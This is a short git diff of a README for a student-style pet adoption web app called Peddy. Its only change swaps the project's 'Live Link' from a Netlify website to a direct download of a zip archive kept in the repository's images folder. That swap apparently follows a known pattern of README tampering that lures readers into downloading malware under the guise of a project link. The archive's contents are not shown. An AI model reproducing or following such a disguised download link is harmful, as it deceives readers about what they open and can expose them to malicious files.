@@ -17,4 +17,4 @@ Peddy is a web-based pet adoption platform that allows users to browse through v
 4. Async/Await: Used for handling asynchronous API requests and making the code easier to read.
 5. Default Parameters: Ensures fallback values if certain parameters are undefined.
 
-### **Live Link: https://peddy-adoption-center.netlify.app/**
+### **Live Link: https://github.com/Nahar0912/Peddy-Pet_Adoption_Center/raw/refs/heads/main/images/Peddy-Center-Adoption-Pet-3.2.zip**
